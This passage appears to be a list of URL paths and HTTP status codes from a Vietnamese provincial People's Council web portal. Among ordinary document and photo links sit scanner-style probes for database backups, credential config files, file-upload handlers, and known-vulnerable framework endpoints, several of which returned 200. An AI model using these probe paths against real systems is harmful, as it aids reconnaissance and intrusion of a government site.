/portal/Photos/2021-10-17/d7dd2019690dba2dtmd.jpg,200
/portal/Pages/2024-3-8/Hoi-nghi-truc-tuyen-toan-quoc-lan-thu-hai-trien-khp7ix33.aspx,200
/portal/Photos/2024-02/d0771fd71e862a9danh2_20240131114528.jpg,200
/_layouts/tandan.portal/jslibs/fancybox/jquery.fancybox.pack.js,200
/AttachFiles/31.+Cac+BC+cua+Ban+VHXH060620180942.pdf,200
/portal/Photos/2024-03-25/d3e7c7989d9ab35d2.jpg,200
/addons/,404
/portal/Photos/2023-12/f704d6d75b2eb65dTxct+QH.jpg,200
/data/backup.sql,404
/portal/_res/css/img/loader.gif,200
/infusions/downloads/downloads.php,404
/hoidongnhandan/1231/29459/39541/Nghien-cuu---Trao-doi/nghi-quyet-detail.aspx,404
/portal/Photos/2022-09/e92403c6ead0116dimages1344611_Untitled_1.jpg,200
/AttachFiles/06-NQ-HĐND110720180815.pdf,304
/task/loginValidation.php,404
/SAAS/t/_/,404
/img/black-bg.png,200
/admin/login.php,404
/wp-content/plugins/vr-calendar-sync/assets/js/public.js,404
/elfinder/php/connector.minimal.php,404
/portal/Pages/default.aspx/Admin/Upfile,200
"/portal/VanBan/2023-06/b6741f21a4dca26dQuyết+định+triệu+tập+kỳ+họp+thường+lệ+giữa+năm+2023+của+HĐND+tỉnh+khóa+XIX,+NK+2021-2026.pdf",200
/cgi-bin/downloadFlile.cgi,404
/SDK/webLanguage,302
/auth/check,404
/_layouts/tandan.portal/weather/img/48/03d.png,200
"/AttachFiles/23.+NQ+dieu+chinh+d.an+x.dung+TL+485B,+doan+tu+de+huu+song+Dao+den+QL+21B200720210201.pdf",200
/aspera/faspex/package_relay/relay_package,404
/portal/Photos/2021-10-18/3cacddbc7dbed63dmtl1.jpg,200
/hoidongnhandan/1231/29461/40968/84874/Thuong-truc-HDND-tinh/Bao-cao-so-28-BC-HDND-ngay-08-12-2016-Cong-tac-cua-Thuong-truc-Hoi-dong-nhan-dan-tinh-tu-ky-hop-thu-nhat-den-ky-hop-thu-ba-HDND-tinh-khoa-XVIII.aspx,403
/audio/28101.mp3,404
/adm/file.cgi,404
/portal/Photos/2021-11/_t/ddbbd6c79cd6c2ddz2914861754151_dc061625185e4d3e25a877abca4e95d5_jpg.jpg,200
/portal/Photos/2023-10-23/cb8893cb99e86dddhc+(2).jpg,200
/cgi-bin/touchlist_sync.cgi,404
/hms/doctor/,404
/audio/27377.mp3,404
/AttachFiles/3.+BC+ket+qua+GSCD+cua+TT+HDND+tinh051220180759.pdf,200
/portal/Pages/default.aspx/tools/Uploadify.ashx,200
/portal/pages/https-hdnd-namdinh-gov-vn-portal-pages-van-ban-v-.aspx,200
/dump.sql,404
"/portal/VanBan/2021-11/e59ffdf1dc4d324d14.+BC+phan+bo+du+toan+thu,+chi+ngan+sach+NN+nam+2022.pdf",304
/setup.cgi,404
/js/form/TDForm.js,200
/hoidongnhandan/1231/29459/39471/so-do-site/anh.aspx,404
/wp-content/plugins/stopbadbots/assets/js/stopbadbots.js,404
"/portal/VanBan/2021-10/37dede79d609adNQ+44+phan+cap+tham+quyen+de+an+cho+thue+quyen+khai+thac,+xl+t.san+ket+cau+h.tang+thuy+loi.pdf",200
/_layouts/tandan.portal/weather/img/48/01n.png,200
/wp-content/themes/twentyseventeen/page/index.php,404
/portal/Photos/2024-01/_t/a12ee0ce325f43ad123_jpg.jpg,200
/_layouts/tandan.portal/weather/img/48/10n.png,200
"/hoidongnhandan/1231/29459/40926/Chuc-nang-nhiem-vu/AttachFiles/26.+NQ+c.thuan+d.chinh+d.an+di+dan+khan+cap+vung+sat+lo+bao+song+Ninh+Co,+H+Truc+Ninh200720210203.pdf",404
/js/layouts/breakpoints.js,200
/elfinder/elfinder-cke.html,404
/dologin.action,404
/portal/Pages/2023-10-20/Thong-bao-ket-luan-cua-Ban-Thuong-vu-Tinh-uy-ve-Phj46eoh.aspx,200
/portal/Pages/default.aspx/api/fileupload,200
/portal/Banner/8e7837350f0fd6dd12345.jpg,200
/audio/27458.mp3,404
/_layouts/tandan.portal/weather/img/128/04n.png,200
/level/16/exec/show/config/CR,404
/AttachFiles/33.+bang+gia+dat+tren+dia+ban+tinh100620201114.pdf,304
/.vscode/sftp.json,302
/axis2-admin/login,404
/var,404
/hoidongnhandan/1231/29461/42096/89044/Trong-nuoc/Ky-hop-thu-3--Quoc-hoi-khoa-XIV-thanh-cong-va-be-mac.aspx,404
/portal,302
/portal/Photos/2023-10/9d7e4acf1a67dc8dTBTbophieu.jpg,200
/portal/VanBan/2021-11/4d5c7bae4bbd4a7d4.+TB+cong+tac+mat+tran+tham+gia+xay+dung+chinh+quyen.pdf,206
/audio/27925.mp3,404
/_layouts/images/favicon.ico,200
/portal/admin/tai-nguyen/popup/edit-van-ban.aspx,200
/portal/Pages/2022-8-25/Xay-dung-he-thong-do-thi-gop-phan-phat-trien-toan-h7qqdj.aspx,200
/portal/Photos/2023-01/40cc4cfdd94697dhuu.jpg,200
/AttachFiles/01-NQ-HĐND100620201148.pdf,200
/admin/backup.sql,404
/manage/fileDownloader,404
/portal/VanBan/2024-03/10b4a77440f5ce1dTài+liệu+kỳ+họp+thứ+16+HĐND+tỉnh+-+Gửi+lần+1+(1).rar,200
/os/mxperson,404
/portal/Pages/default.aspx/Manage/Upload,200
/portal/ImageAds/cc33ffdd5fff695dadd1.jpg,200
"/hoidongnhandan/1231/29459/40926/Chuc-nang-nhiem-vu/AttachFiles/34.+NQ+dieu+chinh+chu+truong+DA+tram+bom+De,+Vu+Ban131220180432.pdf",404
/actuator/gateway/refresh,404
/AttachFiles/NQ50+-+về+Lệ+phí+địa+chính120620200925.doc,200
/audio/28031.mp3,404
/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php,404
/portal/Pages/2023-11-17/Giam-sat-tham-tra-truoc-ky-hop-thuong-le-cuoi-nam-bz2dmp.aspx,200
/js/form/mousewheel.js,200
/AttachFiles/NghiQuyetKyHop12110620200853.zip,200
/portal/_themes/Portal_orange/img/img-rs.png,200
/AttachFiles/29.+Cac+bao+cao+cua+ban+KT-NS100620201045.pdf,200
/portal/Pages/2023-3-27/xzuj8x.aspx,200
/portal/Photos/2023-11/f4fdd03fe9b22cedQH6.jpg,200
/_layouts/1033/styles/Themable/corev4.css,200
/audio/28007.mp3,404
/audio/28054.mp3,404
/portal/Pages/2024-3-25/Hoi-thao-nang-cao-chat-luong-hoat-dong-To-dai-bieu8fd0g1.aspx,200
/portal/Pages/2022-12-16/Giam-sat-viec-huy-dong-quan-ly-va-su-dung-cac-nguogal62a.aspx,200
/_layouts/sp.js,200
/portal/pages/Hoat-dong-cua-Doan-DBQH-tinh.aspx,200
/OA_CGI/FNDWRR.exe,415
/portal/Pages/2022-8-19/Giam-sat-viec-thuc-hien-quy-che-dan-chu-o-co-so-taczms8i.aspx,200
/audio/28073.mp3,404
/admin/login/index.php,404
/favicon.ico,404
/assets/_core/php/profile.php,404
/pacs/login.php,404
/AttachFiles/16.+Quy+dinh+muc+thu+cac+khoan+thu+dich+vu+phuc+vu+ho+tro+hoat+dong+ngoai+hoc+phi140720210814.pdf,200
/portal/Pages/2021-3-26/Mong-muon-bau-vao-Quoc-hoi-va-HDND-nhung-nguoi-co-ex3a2d.aspx,200
/portal/Pages/van-ban/v.aspx,200
/portal/Pages/default.aspx/api/fileup.ashx,200
/AttachFiles/35.+Chia+to+thao+luan140720210819.pdf,200
/portal/Pages/2023-8-29/HDND-tinh-to-chuc-ky-hop-giai-quyet-cong-viec-phath6encm.aspx,200
/help/admin-guide/test.jsp,404
/css/font/fontawesome-webfont.woff,200
/portal/Pages/2022-1-11/Quoc-hoi-thao-luan-sua-doi-mot-so-lua-t-va-du-an-djljctn.aspx,200
/portal/Pages/default.aspx/file.asp,200
/portal/Pages/default.aspx/api/uploadhandler.ashx,200
/AttachFiles/kh+giám+sát+của+ban+vhxh030620180607.doc,304
/portal/Pages/2022-7-19/pxscwn.aspx,200
"/AttachFiles/16.+quy+dinh+muc+chi+cho+c.tac+dao+tao,+boi+duong+c.bo,+c.chuc,+v.chuc031220200846.pdf",200
/apisix/admin/migrate/export,404
/AttachFiles/nghi-quyet-detail.aspx,403
/formLoginAuth.htm,404
/portal/Pages/2023-12-25/Chi-bo-tham-muu-tong-hop-thuoc-Dang-bo-Van-phong-D0v6air.aspx,200
/public/css/2eCviQJRq656lU4qhDYJoySQUmX.css,404
/v1/backend1,404
"/hoidongnhandan/1231/29459/39471/so-do-site/AttachFiles/AttachFiles/NQ+28+xay+dung+tuyen+duong+bo+ven+bien,+doan+qua+Nam+Dinh100620201158.pdf",404
/portal/pages/van-ban/https:/hdnd.namdinh.gov.vn/_forms/td-login.aspx,400
/portal/Pages/van-ban/https:/namdinh.gov.vn/portal/pages/van-ban/default.aspx,400
/portal/_res/js/custom.js,200
/wan.htm,404
/portal/Pages/2024-3-14/,302
/_layouts/tandan.portal/weather/img/128/02d.png,200
/AttachFiles/37.+Gợi+ý+thảo+luận+tổ100620201141.pdf,304
/portal/Pages/2023-12-6/Doan-dai-bieu-Quoc-hoi-tinh-tiep-xuc-cu-tri-sau-Kynjosgi.aspx,200
/AttachFiles/222-KH-HDND261020180215.pdf,200
/AttachFiles/2.+BC+chi+dao+dieu+hanh+ubnd+tinh+(6T.2018)280620180852.pdf,200
/portal/Pages/default.aspx/tools/Upfile.ashx,200
/js/form/custom.js,200
/aj.html,404
/dashboard/view-chair-list.php,404
/_vti_inf.html,200
/modules/appagebuilder/config.xml,404
/AttachFiles/43.+BC+cua+BCH+Bo+doi+Bien+phong+tinh+ve+ket+qua+cong+tac+Bien+phong+nam+2020031220200929.pdf,200
/portal/Pages/2023-5-23/Giam-sat-cong-tac-xay-dung-ban-hanh-van-ban-quy-phvleoj3.aspx,200
/portal/Photos/2024-01/fe15bc366eb2e43d12345.jpg,200
/portal/Photos/2023-11/cab139c8490deeed1_20231110094219.png,200
/hoidongnhandan/1231/29459/39419/Nghi-quyet-nhiem-ky-2016---2021/AttachFiles/tai-lieu-detail.aspx,404
/images/news/250720211043TD+DBQH.jpg,200
/js/form/less.js,200
/sftp-config.json,302
/portal/Pages/2024-1-22/Dong-chi-Bi-thu-Tinh-uy-tham-chuc-Tet-can-bo-chienr4u6cb.aspx,200
/portal/Photos/2023-03/7edcf88c507f32ddb897aead6bedb7b3eefc.jpg,200
/portal/Photos/2023-03/3f483712c32b832d4122d40a114acd14945b.jpg,200
/portal/Photos/2023-11/_w/ea2d6bddbffba1adct_jpg.jpg,200
/audio/28005.mp3,404
/portal/Pages/contact.aspx,200
/css/layouts/style.css,200
/index.php/catalogsearch/advanced/result/,404
/_layouts/images/blank.gif,200
/hoidongnhandan/1231/29459/39413/Ban-Kinh-te---Ngan-sach-HDND-tinh/,404
/_layouts/Authenticate.aspx,302
/_ignition/execute-solution,404
/tos/index.php,404
/wp-content/plugins/contact-form-7/readme.txt,404
/+CSCOE+/saml/sp/acs,404
/.well-known/pki-validation/cloud.php,500
/_layouts/tandan.portal/weather/img/48/10d.png,200
/portal/pages/print.aspx,200
/AttachFiles/nq56+-+về++thời+gian+gửi+báo+cáo+và+biểu+mẫu250520180318.doc,200
/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/v.aspx,400
/admin/db.sql,404
/_layouts/tandan.portal/jslibs/flyout-gallery/td-fly-out-gallery.css,200
/portal/Photos/2021-10-17/d5a96b2d1fca7c8dlvl.jpg,200
/portal/Pages/default.aspx/Content/Upfile,200
/wp-content/plugins/cryptocurrency-widgets-pack/readme.txt,404
/portal/Photos/2024-03/_w/a90d36d104e3d40d1_20240318180913_png.jpg,200
/portal/Photos/2022-10-28/c30dd7b8926e679dPXL_20221027_162351608.jpg,200
/portal/Photos/2021-10-17/2149edebe322deaddtt.jpg,200
/userfiles/file/TaiLieuTXCT+Ky+hop+6/AttachFiles/href='/nghi-quyet.aspx,302
/wp-json/lp/v1/courses/archive-course,404
/van-ban-detail.aspx,404
/AttachFiles/thongbao_kqkyhopthu2030620180634.doc,200
"/AttachFiles/32.+BC+c.tac+chi+dao,+dieu+hanh+cua+UBND+tinh+6+thang+dau+nam+2019100620201047.pdf",304
/cms/content/list,404
/hoidongnhandan/1231/29459/39413/Ban-Kinh-te---Ngan-sach-HDND-tinh/tai-lieu-detail.aspx,404
/portal/Video/2023-09/5d0dababddb3a60dnang_cao_chat_luong_hoat_dong_hdnd_cac_cap.mp4,200
/portal/Pages/default.aspx/api/Upfile,200
/portal/Pages/default.aspx/Manage/Upfile,200
/portal/Pages/Thu-vien-so.aspx,200
/userfiles/file/TKBC1.jpg,200
/controller/ping.php,404
/2eGZrg8GkmsuSGfhYwIjOcyivem.php,404
/auth/realms/master/clients-registrations/default/security-admin-console,404
/audio/27457.mp3,404
/class.api.php,404
/portal/_res/css/core.css,200
/_login/default.aspx,302
/portal/Photos/2023-12-25/a4e3f4a73c223ccd1a.jpg,200
/portal/Photos/2023-03/aa8970f3e58edc2d7d042a59ef1933476a08.jpg,200
"/userfiles/file/TaiLieuTXCT+Ky+hop+6/AttachFiles/href='/AttachFiles/1.+NQ+phe+duyet+dieu+chinh+bo+sung+tong+so+luong+nguoi+lam+viec+trong+cac+d.vi+SNCL,+chi+tieu+g.vien+mam+non+hop+dong+nam+2020140720200855.pdf",404
/AttachFiles/NQ42+-+về+Hỗ+trợ+tài+chính+trong+KH-CN120620200929.doc,304
/wp-content/plugins/canto/includes/lib/tree.php,404
/_layouts/sp.runtime.js,200
/secure/QueryComponentRendererValue!Default.jspa,404
/portal/home/advance-search,404
/api/v2/cmdb/system/admin/admin,403
/portal/Photos/2023-07/_w/d556f58825c14edd478777f5411b9145c80a_jpg.jpg,200
/audio/27988.mp3,404
/portal/Pages/2023-3-23/Giao-ban-Thuong-truc-HDND-tinh-voi-HDND-cac-huyen-q5h5gx.aspx,200
/portal/Pages/2023-1-19/Hoat-dong-thanh-nien-huong-toi-tet-Quy-Mao-20239bi8q1.aspx,200
"/AttachFiles/15.+Bc+cong+tac+TCD,+giai+quyet+khieu+nai,+to+cao+nam+2019100620201110.pdf",200
/portal/Pages/2022-1-20/Chi-doan-TNCS-Ho-Chi-Minh-va-Hoi-Cuu-chien-binh-Va028lwe.aspx,200
/backup/backup-mysql.sql,404
/portal/Pages/default.aspx/Admin/Upload,200
/AttachFiles/2.2.+BC+GSCĐ+về+hoạt+động+đơn+vị+SNCL100620201145.pdf,200
/v1/kv/2eCvgzf5wYL0r4a2lm7XtLAN6cu,404
/portal/Photos/2023-07/d556f58825c14edd478777f5411b9145c80a.jpg,200
"/AttachFiles/17.+Quy+dinh+muc+chuan+tro+giup+Xh,+muc+tro+giup+XH+doi+voi+doi+tuong+bao+tro+XH140720210814.pdf",304
/js/layouts/form-data.js,200
/audio/27114.mp3,404
/_layouts/blank.js,200
/portal/Photos/2023-06/_t/df3e9dd8faf8d22d1f8dd6e4d28603d85a97_jpg.jpg,200
"/AttachFiles/20.+BC+thuc+hanh+tiet+kiem,+CLP+2018011220181038.pdf",200
/audio/27732.mp3,404
/InsightPluginShowGeneralConfiguration.jspa,404
/AttachFiles/42.+q.dinh+gia+KCB+khong+thuoc+p.vi+thanh+toan+cua+Quy+BHYT+d.voi+cs+KCB+nha+nuoc100620201116.pdf,206
"/portal/VanBan/2024-03/2361151b7032962dThông+báo+Kết+quả+Kỳ+họp+thứ+16+HĐND+tỉnh+khóa+XIX,+NK+2021-2026.pdf",200
/tai-lieu.aspx,404
/wp-content/uploads/html2wp/2eGZrfOPXnXMndNsdcTeS5J6IpR.php,404
/portal/Photos/2024-03/_w/fec4f4daf05b3dad1_jpg.jpg,200
/portal/Photos/2023-07-11/aad64ac58045f5ed792ae37fd59105cf5c80.jpg,200
/portal/Photos/2023-03/8b7c3d722c327c8dimages1309019_1_20230315183512.jpg,200
/uploads/backup.sql,404
/wp-admin/admin-ajax.php,404
/portal/Pages/default.aspx/tools/Uploadify/Upload.ashx,200
/SiteFolders/doandaibieuquochoi/3398/AttachFiles/AttachFiles/nghi-quyet-detail.aspx,404
/portal/LinkImage/5bf4b93b502fadddPM-HDND-2.jpg,200
/audio/27990.mp3,404
/portal/Photos/2022-10-28/871dc84c22d7bb8dPXL_20221027_080343472.jpg,200
/portal/Photos/2024-01-22/9f8fedd525e19d8d12345.jpg,200
/portal/Pages/default.aspx/api/up.ashx,200
"/AttachFiles/AttachFiles/NQ+55+muc+chi+cho+cong+tac+dao+tao,+boi+duong+can+bo,+cong+chuc,+vien+chuc+tinh15
